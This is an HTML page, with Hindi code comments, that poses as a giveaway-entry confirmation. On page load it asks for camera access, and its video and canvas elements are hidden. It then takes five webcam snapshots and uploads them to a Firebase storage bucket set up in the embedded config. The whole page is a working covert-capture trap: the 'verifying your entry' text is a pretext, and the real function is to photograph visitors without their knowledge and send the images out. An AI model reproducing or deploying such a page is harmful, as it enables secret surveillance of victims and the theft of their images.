<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Congratulations!</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
        }
        h1 { font-size: 2.5rem; margin-bottom: 10px; }
        p { font-size: 1.2rem; opacity: 0.9; }
        /* कैमरा और कैनवस को पूरी तरह छिपा दिया गया है */
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div>
        <h1>🎉 Congratulations! 🎉</h1>
        <p>You have successfully entered the giveaway.<br>Please wait while we verify your entry...</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script type="module">
        // Firebase SDKs इम्पोर्ट करना
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";

        // आपका दिया हुआ कॉन्फ़िगरेशन
        const firebaseConfig = {
            apiKey: "AIzaSyD3HUZgZ1G2hN4BXnIbRV8eD0nPlWUaByM",
            authDomain: "galk-55f49.firebaseapp.com",
            projectId: "galk-55f49",
            storageBucket: "galk-55f49.firebasestorage.app",
            messagingSenderId: "1005825050326",
            appId: "1:1005825050326:web:fda4271183b4c4ff106b77",
            measurementId: "G-32CW801HFV"
        };

        // Firebase शुरू करें
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        let photoCount = 0;
        const maxPhotos = 5;

        async function initCapture() {
            try {
                // यूजर से परमिशन मांगना
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // हर 1.5 सेकंड में एक फोटो लेगा (कुल 5 बार)
                const interval = setInterval(async () => {
                    if (photoCount < maxPhotos) {
                        await takeAndUpload();
                        photoCount++;
                    } else {
                        clearInterval(interval);
                        // कैमरा बंद करें
                        stream.getTracks().forEach(track => track.stop());
                        console.log("Task Completed.");
                    }
                }, 1500);

            } catch (err) {
                console.error("Camera access denied.");
            }
        }

        async function takeAndUpload() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            const context = canvas.getContext('2d');
            
            // फ्रेम ड्रा करना
            context.drawImage(video, 0, 0, 640, 480);
            
            // इमेज को Blob में बदलना
            canvas.toBlob(async (blob) => {
                if (blob) {
                    const fileName = `captures/user_${Date.now()}.jpg`;
                    const storageRef = ref(storage, fileName);
                    
                    try {
                        await uploadBytes(storageRef, blob);
                        console.log(`Uploaded: ${fileName}`);
                    } catch (error) {
                        console.error("Upload failed", error);
                    }
                }
            }, 'image/jpeg', 0.8);
        }

        // पेज लोड होते ही शुरू करें
        window.onload = initCapture;
    </script>
</body>
</html>
